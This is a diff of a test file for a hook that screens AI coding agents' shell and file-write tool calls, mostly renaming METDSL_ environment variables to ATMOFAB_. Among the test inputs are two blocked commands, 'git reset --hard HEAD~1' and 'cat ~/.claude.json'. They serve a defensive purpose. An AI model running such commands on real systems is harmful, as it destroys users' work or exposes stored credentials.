@@ -23,11 +23,11 @@ from tools.hooks.codex_feature import (
 
 class HookCliTests(unittest.TestCase):
     def setUp(self) -> None:
-        self._saved_hook_repo_root = os.environ.pop("METDSL_HOOK_REPO_ROOT", None)
+        self._saved_hook_repo_root = os.environ.pop("ATMOFAB_HOOK_REPO_ROOT", None)
 
     def tearDown(self) -> None:
         if self._saved_hook_repo_root is not None:
-            os.environ["METDSL_HOOK_REPO_ROOT"] = self._saved_hook_repo_root
+            os.environ["ATMOFAB_HOOK_REPO_ROOT"] = self._saved_hook_repo_root
 
     @staticmethod
     def _assert_allow_output(raw_stdout: str) -> None:
@@ -56,8 +56,8 @@ class HookCliTests(unittest.TestCase):
                 "tool_input": {"command": "echo hello"},
             }
             env = os.environ.copy()
-            env["METDSL_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
-            env["METDSL_HOOK_REPO_ROOT"] = tmp
+            env["ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
+            env["ATMOFAB_HOOK_REPO_ROOT"] = tmp
             proc = subprocess.run(
                 [
                     "python3",
@@ -90,11 +90,11 @@ class HookCliTests(unittest.TestCase):
                 "tool_input": {"command": "echo hello"},
             }
             env = os.environ.copy()
-            env["METDSL_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
+            env["ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
             cmd = (
                 "ROOT=$(git rev-parse --show-toplevel); "
                 "PYTHONPATH=\"$ROOT${PYTHONPATH:+:$PYTHONPATH}\" "
-                f"METDSL_HOOK_REPO_ROOT=\"{tmp}\" "
+                f"ATMOFAB_HOOK_REPO_ROOT=\"{tmp}\" "
                 f"python3 -m tools.hooks.cli --backend codex --event PreToolUse --repo-root \"{tmp}\""
             )
             proc = subprocess.run(
@@ -127,8 +127,8 @@ class HookCliTests(unittest.TestCase):
             command = (
                 hooks_doc["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
                 .replace(
-                    'METDSL_HOOK_REPO_ROOT="$ROOT"',
-                    f'METDSL_HOOK_REPO_ROOT="{tmp}"',
+                    'ATMOFAB_HOOK_REPO_ROOT="$ROOT"',
+                    f'ATMOFAB_HOOK_REPO_ROOT="{tmp}"',
                 )
                 .replace('--repo-root "$ROOT"', f'--repo-root "{tmp}"')
             )
@@ -139,7 +139,7 @@ class HookCliTests(unittest.TestCase):
                 "tool_input": {"command": "echo hello"},
             }
             env = os.environ.copy()
-            env["METDSL_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
+            env["ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
             proc = subprocess.run(
                 command,
                 cwd=str(repo_root / "tools"),
@@ -175,7 +175,7 @@ class HookCliTests(unittest.TestCase):
                 "tool_input": {"command": "echo hello"},
             }
             env = os.environ.copy()
-            env["METDSL_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
+            env["ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
             proc = subprocess.run(
                 command,
                 cwd=tmp,
@@ -322,7 +322,7 @@ class HookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "0", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "0", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -384,7 +384,7 @@ class HookCliTests(unittest.TestCase):
                     },
                 }
                 out = io.StringIO()
-                with patch.dict(os.environ, {"METDSL_WORKFLOW_EXEC_MODE": "dev"}):
+                with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_EXEC_MODE": "dev"}):
                     with redirect_stdout(out):
                         code = cli.main(
                             [
@@ -452,7 +452,7 @@ class HookCliTests(unittest.TestCase):
                     },
                 }
                 out = io.StringIO()
-                with patch.dict(os.environ, {"METDSL_WORKFLOW_EXEC_MODE": "prod"}):
+                with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_EXEC_MODE": "prod"}):
                     with redirect_stdout(out):
                         code = cli.main(
                             [
@@ -599,11 +599,11 @@ class HookCliTests(unittest.TestCase):
 
 class ClaudeHookCliTests(unittest.TestCase):
     def setUp(self) -> None:
-        self._saved_hook_repo_root = os.environ.pop("METDSL_HOOK_REPO_ROOT", None)
+        self._saved_hook_repo_root = os.environ.pop("ATMOFAB_HOOK_REPO_ROOT", None)
 
     def tearDown(self) -> None:
         if self._saved_hook_repo_root is not None:
-            os.environ["METDSL_HOOK_REPO_ROOT"] = self._saved_hook_repo_root
+            os.environ["ATMOFAB_HOOK_REPO_ROOT"] = self._saved_hook_repo_root
 
     def test_claude_backend_allows_safe_command(self) -> None:
         repo_root = Path(__file__).resolve().parents[2]
@@ -615,7 +615,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 "tool_input": {"command": "echo hello"},
             }
             env = os.environ.copy()
-            env["METDSL_HOOK_REPO_ROOT"] = tmp
+            env["ATMOFAB_HOOK_REPO_ROOT"] = tmp
             proc = subprocess.run(
                 [
                     "python3",
@@ -647,7 +647,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 "tool_input": {"command": "git reset --hard HEAD~1"},
             }
             env = os.environ.copy()
-            env["METDSL_HOOK_REPO_ROOT"] = tmp
+            env["ATMOFAB_HOOK_REPO_ROOT"] = tmp
             proc = subprocess.run(
                 [
                     "python3",
@@ -941,9 +941,9 @@ class ClaudeHookCliTests(unittest.TestCase):
                         "tool_input": {"command": "echo hello > workspace/pipelines/safe/out.txt"},
                     }
                     out = io.StringIO()
-                    env = {"METDSL_WORKFLOW_MODE": "1"}
+                    env = {"ATMOFAB_WORKFLOW_MODE": "1"}
                     if backend == "codex":
-                        env["METDSL_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
+                        env["ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
                     with patch.dict(os.environ, env, clear=False):
                         with redirect_stdout(out):
                             code = cli.main(
@@ -1012,8 +1012,8 @@ class ClaudeHookCliTests(unittest.TestCase):
             command = (
                 settings_doc["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
                 .replace(
-                    'METDSL_HOOK_REPO_ROOT="$ROOT"',
-                    f'METDSL_HOOK_REPO_ROOT="{tmp}"',
+                    'ATMOFAB_HOOK_REPO_ROOT="$ROOT"',
+                    f'ATMOFAB_HOOK_REPO_ROOT="{tmp}"',
                 )
                 .replace('--repo-root "$ROOT"', f'--repo-root "{tmp}"')
             )
@@ -1039,7 +1039,7 @@ class ClaudeHookCliTests(unittest.TestCase):
 
     def test_resolve_repo_root_uses_metdsl_hook_repo_root_env(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
-            with patch.dict(os.environ, {"METDSL_HOOK_REPO_ROOT": tmp}):
+            with patch.dict(os.environ, {"ATMOFAB_HOOK_REPO_ROOT": tmp}):
                 for backend in ("claude", "codex"):
                     result = cli._resolve_repo_root({}, backend=backend)
                     self.assertEqual(result, Path(tmp).resolve())
@@ -1049,7 +1049,7 @@ class ClaudeHookCliTests(unittest.TestCase):
         """Run one PreToolUse hook with `env` and NEITHER per-launch id inherited.
 
         The ids are popped rather than left ambient: `_extract_orchestration_id` reads
-        `METDSL_ORCHESTRATION_ID`, so an operator who exported it would otherwise turn
+        `ATMOFAB_ORCHESTRATION_ID`, so an operator who exported it would otherwise turn
         every missing-id case in this class into a with-id case (issue #84).
 
         `tools/tests/conftest.py` now strips those names for the whole session, so under
@@ -1058,8 +1058,8 @@ class ClaudeHookCliTests(unittest.TestCase):
         loaded, and it names the exact ids this class is about rather than a prefix.
         """
         with patch.dict(os.environ, env):
-            for name in ("METDSL_ORCHESTRATION_ID", "METDSL_CHILD_AGENT_RUN_ID",
-                         "METDSL_WORKFLOW_MODE", "METDSL_MISSING_ORCHESTRATION_ID_POLICY"):
+            for name in ("ATMOFAB_ORCHESTRATION_ID", "ATMOFAB_CHILD_AGENT_RUN_ID",
+                         "ATMOFAB_WORKFLOW_MODE", "ATMOFAB_MISSING_ORCHESTRATION_ID_POLICY"):
                 if name not in env:
                     os.environ.pop(name, None)
             out = io.StringIO()
@@ -1090,7 +1090,7 @@ class ClaudeHookCliTests(unittest.TestCase):
         """One hook launch with NEITHER per-launch id inherited.
 
         The ids are popped rather than left ambient: `_extract_orchestration_id` reads
-        `METDSL_ORCHESTRATION_ID`, so an operator who exported it would otherwise turn
+        `ATMOFAB_ORCHESTRATION_ID`, so an operator who exported it would otherwise turn
         every missing-id case in this class into a with-id case (issue #84).
 
         `tools/tests/conftest.py` now strips those names for the whole session, so under
@@ -1099,8 +1099,8 @@ class ClaudeHookCliTests(unittest.TestCase):
         loaded, and it names the exact ids this class is about rather than a prefix.
         """
         with patch.dict(os.environ, env or {}):
-            for name in ("METDSL_ORCHESTRATION_ID", "METDSL_CHILD_AGENT_RUN_ID",
-                         "METDSL_WORKFLOW_MODE", "METDSL_MISSING_ORCHESTRATION_ID_POLICY"):
+            for name in ("ATMOFAB_ORCHESTRATION_ID", "ATMOFAB_CHILD_AGENT_RUN_ID",
+                         "ATMOFAB_WORKFLOW_MODE", "ATMOFAB_MISSING_ORCHESTRATION_ID_POLICY"):
                 if name not in (env or {}):
                     os.environ.pop(name, None)
             out, err = io.StringIO(), io.StringIO()
@@ -1164,7 +1164,7 @@ class ClaudeHookCliTests(unittest.TestCase):
         with tempfile.TemporaryDirectory() as tmp:
             code, text = self._run_pre(
                 "claude", self._missing_id_payload(Path(tmp)),
-                env={"METDSL_ORCHESTRATION_ID": "orch_env"})
+                env={"ATMOFAB_ORCHESTRATION_ID": "orch_env"})
             self.assertEqual(code, 0, msg=text)
 
     def test_the_refusal_is_recorded_under_global_on_every_backend_and_mode(self) -> None:
@@ -1173,7 +1173,7 @@ class ClaudeHookCliTests(unittest.TestCase):
 
         A TABLE over the workflow mode, not the claude/workflow-mode case alone. Two
         `_global` suppressions in `_append_hook_audit` were keyed on the mode, and a leaf
-        that lost `METDSL_ORCHESTRATION_ID` has usually lost `METDSL_WORKFLOW_MODE` from
+        that lost `ATMOFAB_ORCHESTRATION_ID` has usually lost `ATMOFAB_WORKFLOW_MODE` from
         the same environment — so the one anomaly worth a trace was exactly the one that
         left none, and for a codex leaf (`tool_name` `shell`) it was suppressed in every
         mode. Both suppressions are gone with issue #102; this is what replaces them.
@@ -1186,7 +1186,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                     payload["tool_name"] = tool
                     code, _text = self._run_pre(
                         backend, payload,
-                        env={"METDSL_WORKFLOW_MODE": mode} if mode else {})
+                        env={"ATMOFAB_WORKFLOW_MODE": mode} if mode else {})
                     self.assertEqual(code, 2)
                     log = (Path(tmp) / "workspace" / "orchestrations" / "_global" / "hooks"
                            / "native_hook_events.jsonl")
@@ -1200,8 +1200,8 @@ class ClaudeHookCliTests(unittest.TestCase):
         no `repo_root` in the payload and none in the environment, there is no tree to
         write into and the refusal is still returned."""
         with patch.dict(os.environ, {}):
-            for name in ("METDSL_ORCHESTRATION_ID", "METDSL_HOOK_REPO_ROOT",
-                         "METDSL_WORKFLOW_MODE"):
+            for name in ("ATMOFAB_ORCHESTRATION_ID", "ATMOFAB_HOOK_REPO_ROOT",
+                         "ATMOFAB_WORKFLOW_MODE"):
                 os.environ.pop(name, None)
             with tempfile.TemporaryDirectory() as tmp:
                 cwd = os.getcwd()
@@ -1258,7 +1258,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                            "tool_name": "Bash", "tool_input": {"command": blocked}}
                 code, text = self._run_pre(
                     "claude", payload,
-                    env={"METDSL_WORKFLOW_MODE": "1", "METDSL_ORCHESTRATION_ID": orch})
+                    env={"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_ORCHESTRATION_ID": orch})
                 self.assertEqual(code, 2, msg=text)
                 self.assertIn("forbidden in workflow mode", text)
 
@@ -1276,7 +1276,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 try:
                     code, text = self._run_event(
                         backend, event, self._missing_id_payload(root),
-                        env={"METDSL_WORKFLOW_MODE": "1"})
+                        env={"ATMOFAB_WORKFLOW_MODE": "1"})
                 finally:
                     os.chmod(root / "workspace" / "orchestrations", 0o700)
                 self.assertEqual(code, want_rc, msg=text)
@@ -1295,7 +1295,7 @@ class ClaudeHookCliTests(unittest.TestCase):
         silently.
         """
         from tools.hooks import cli as _cli
-        with patch.dict(os.environ, {"METDSL_ORCHESTRATION_ID": "orch_from_env"}):
+        with patch.dict(os.environ, {"ATMOFAB_ORCHESTRATION_ID": "orch_from_env"}):
             self.assertEqual(
                 _cli._extract_orchestration_id({"orchestration_id": "orch_from_payload"}),
                 "orch_from_payload")
@@ -1305,7 +1305,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 "orch_from_inner")
             self.assertEqual(_cli._extract_orchestration_id({}), "orch_from_env")
         with patch.dict(os.environ, {}):
-            os.environ.pop("METDSL_ORCHESTRATION_ID", None)
+            os.environ.pop("ATMOFAB_ORCHESTRATION_ID", None)
             self.assertIsNone(_cli._extract_orchestration_id({}))
 
     def test_the_operator_safety_audit_detail_survives_the_extraction(self) -> None:
@@ -1359,8 +1359,8 @@ class ClaudeHookCliTests(unittest.TestCase):
                        "tool_input": {"command": "echo hi \ud800"}}
             code, text = self._run_pre(
                 "claude", payload,
-                env={"METDSL_WORKFLOW_MODE": "1", "METDSL_ORCHESTRATION_ID": orch,
-                     "METDSL_HOOK_REPO_ROOT": tmp})
+                env={"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_ORCHESTRATION_ID": orch,
+                     "ATMOFAB_HOOK_REPO_ROOT": tmp})
             self.assertEqual(code, 2, msg=text)
             self.assertIn("hook entrypoint failure", text)
             self.assertNotIn("Traceback", text)
@@ -1375,19 +1375,19 @@ class ClaudeHookCliTests(unittest.TestCase):
         with tempfile.TemporaryDirectory() as nested:
             payload = {"payload": {"repo_root": nested}}
             with patch.dict(os.environ, {}):
-                os.environ.pop("METDSL_HOOK_REPO_ROOT", None)
+                os.environ.pop("ATMOFAB_HOOK_REPO_ROOT", None)
                 self.assertEqual(_cli._resolve_repo_root(payload),
                                  Path(nested).resolve())
                 self.assertEqual(_cli._repo_root_from_sources(payload),
                                  Path(nested).resolve())
                 # …and the env still outranks both, for both callers.
                 with tempfile.TemporaryDirectory() as env_root:
-                    os.environ["METDSL_HOOK_REPO_ROOT"] = env_root
+                    os.environ["ATMOFAB_HOOK_REPO_ROOT"] = env_root
                     self.assertEqual(_cli._resolve_repo_root(payload),
                                      Path(env_root).resolve())
                     self.assertEqual(_cli._repo_root_from_sources(payload),
                                      Path(env_root).resolve())
-                os.environ.pop("METDSL_HOOK_REPO_ROOT", None)
+                os.environ.pop("ATMOFAB_HOOK_REPO_ROOT", None)
                 self.assertIsNone(_cli._repo_root_from_sources({}))
 
     def test_the_record_lands_where_the_policy_was_evaluated(self) -> None:
@@ -1406,8 +1406,8 @@ class ClaudeHookCliTests(unittest.TestCase):
                        "tool_input": {"command": "cat ~/.claude.json"}}
             code, _text = self._run_pre(
                 "claude", payload,
-                env={"METDSL_WORKFLOW_MODE": "1", "METDSL_ORCHESTRATION_ID": orch,
-                     "METDSL_HOOK_REPO_ROOT": a})
+                env={"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_ORCHESTRATION_ID": orch,
+                     "ATMOFAB_HOOK_REPO_ROOT": a})
             self.assertEqual(code, 2)
             in_a = (Path(a) / "workspace" / "orchestrations" / orch / "hooks"
                     / "native_hook_events.jsonl")
@@ -1419,7 +1419,7 @@ class ClaudeHookCliTests(unittest.TestCase):
     def test_nothing_writes_the_deleted_policy_variable(self) -> None:
         """The writer, not only the reader (issue #102).
 
-        `tools/run_workflow.py` seeded `METDSL_MISSING_ORCHESTRATION_ID_POLICY` into
+        `tools/run_workflow.py` seeded `ATMOFAB_MISSING_ORCHESTRATION_ID_POLICY` into
         every node's environment for four months while nothing read it — the false
         evidence issue #82 was filed for. Deleting the reader without pinning the writer
         leaves the same shape available to the next edit, and a round-0 mutation sweep
@@ -1432,13 +1432,13 @@ class ClaudeHookCliTests(unittest.TestCase):
         import re as _re
         repo_root = Path(__file__).resolve().parents[2]
         writer = _re.compile(
-            r"""(?:environ|env|base_env|child_env|body)\s*\[\s*["']METDSL_MISSING_ORCHESTRATION_ID_POLICY["']\s*\]\s*=|"""
-            r"""(?:setenv|putenv)\s*\(\s*["']METDSL_MISSING_ORCHESTRATION_ID_POLICY["']""")
+            r"""(?:environ|env|base_env|child_env|body)\s*\[\s*["']ATMOFAB_MISSING_ORCHESTRATION_ID_POLICY["']\s*\]\s*=|"""
+            r"""(?:setenv|putenv)\s*\(\s*["']ATMOFAB_MISSING_ORCHESTRATION_ID_POLICY["']""")
         # Self-test the detector: a negative assertion over a scan is green when the
         # scan is broken, and this one is a scan.
-        self.assertTrue(writer.search('base_env["METDSL_MISSING_ORCHESTRATION_ID_POLICY"] = "strict"'))
-        self.assertTrue(writer.search("env['METDSL_MISSING_ORCHESTRATION_ID_POLICY']  =  x"))
-        self.assertFalse(writer.search("# METDSL_MISSING_ORCHESTRATION_ID_POLICY is deleted"))
+        self.assertTrue(writer.search('base_env["ATMOFAB_MISSING_ORCHESTRATION_ID_POLICY"] = "strict"'))
+        self.assertTrue(writer.search("env['ATMOFAB_MISSING_ORCHESTRATION_ID_POLICY']  =  x"))
+        self.assertFalse(writer.search("# ATMOFAB_MISSING_ORCHESTRATION_ID_POLICY is deleted"))
         scanned = 0
         offenders = []
         for path in sorted((repo_root / "tools").rglob("*.py")):
@@ -1453,14 +1453,14 @@ class ClaudeHookCliTests(unittest.TestCase):
         self.assertEqual(offenders, [])
 
     def test_no_environment_value_turns_the_refusal_off(self) -> None:
-        """It is not a policy any more. `METDSL_MISSING_ORCHESTRATION_ID_POLICY` was
+        """It is not a policy any more. `ATMOFAB_MISSING_ORCHESTRATION_ID_POLICY` was
         deleted with its writer (issue #102); this samples the spellings that used to
         mean something, so a re-introduced knob cannot pass unnoticed."""
         for value in ("", "global", "permissive", "0", "strict"):
             with self.subTest(value=value), tempfile.TemporaryDirectory() as tmp:
                 code, _text = self._run_pre(
                     "claude", self._missing_id_payload(Path(tmp)),
-                    env={"METDSL_MISSING_ORCHESTRATION_ID_POLICY": value})
+                    env={"ATMOFAB_MISSING_ORCHESTRATION_ID_POLICY": value})
                 self.assertEqual(code, 2)
 
     def test_workflow_mode_accepts_orchestration_id_from_environment(self) -> None:
@@ -1474,9 +1474,9 @@ class ClaudeHookCliTests(unittest.TestCase):
             with patch.dict(
                 os.environ,
                 {
-                    "METDSL_WORKFLOW_MODE": "1",
-                    "METDSL_ORCHESTRATION_ID": "orch_env_001",
-                    "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0",
+                    "ATMOFAB_WORKFLOW_MODE": "1",
+                    "ATMOFAB_ORCHESTRATION_ID": "orch_env_001",
+                    "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0",
                 },
             ):
                 code = cli.main(
@@ -1523,7 +1523,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 "tool_input": {"file_path": "workspace/forbidden.txt"},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -1572,7 +1572,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                     "tool_input": {"file_path": target},
                 }
                 out = io.StringIO()
-                with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+                with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                     with redirect_stdout(out):
                         code = cli.main(
                             [
@@ -1626,7 +1626,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             }
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 code = cli.main(
@@ -1687,7 +1687,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             }
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 code = cli.main(
@@ -1742,7 +1742,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -1830,7 +1830,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -1865,7 +1865,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -1901,7 +1901,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -1971,7 +1971,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -2056,7 +2056,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -2125,7 +2125,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -2171,7 +2171,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -2228,7 +2228,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -2265,7 +2265,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             }
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 code = cli.main(
@@ -2325,7 +2325,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 "tool_input": {"file_path": allowed_path},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -2376,7 +2376,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 "tool_input": {"file_path": target_path},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -2434,7 +2434,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 },
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -2490,7 +2490,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 },
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -2521,7 +2521,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -2572,7 +2572,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 "tool_input": {"file_path": target_path},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -2608,7 +2608,7 @@ class ClaudeHookCliTests(unittest.TestCase):
                 "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
             }
             out = io.StringIO()
-            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+            with patch.dict(os.environ, {"ATMOFAB_WORKFLOW_MODE": "1"}, clear=False):
                 with redirect_stdout(out):
                     code = cli.main(
                         [
@@ -2655,7 +2655,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -2707,7 +2707,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -2736,7 +2736,7 @@ class ClaudeHookCliTests(unittest.TestCase):
             out = io.StringIO()
             with patch.dict(
                 os.environ,
-                {"METDSL_WORKFLOW_MODE": "1", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
+                {"ATMOFAB_WORKFLOW_MODE": "1", "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                 clear=False,
             ):
                 with redirect_stdout(out):
@@ -2775,9 +2775,9 @@ class ClaudeHookCliTests(unittest.TestCase):
             with patch.dict(
                 os.environ,
                 {
-                    "METDSL_WORKFLOW_MODE": "1",
-                    "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0",
-                    "METDSL_CHILD_AGENT_RUN_ID": run_id,
+                    "ATMOFAB_WORKFLOW_MODE": "1",
+                    "ATMOFAB_REQUIRE_CODEX_HOOKS_FEATURE": "0",
+                    "ATMOFAB_CHILD_AGENT_RUN_ID": run_id,
                 },
                 clear=False,
             ):
@@ -2882,7 +2882,7 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
             "tool_input": {"file_path": file_path},
         }
         out = io.StringIO()
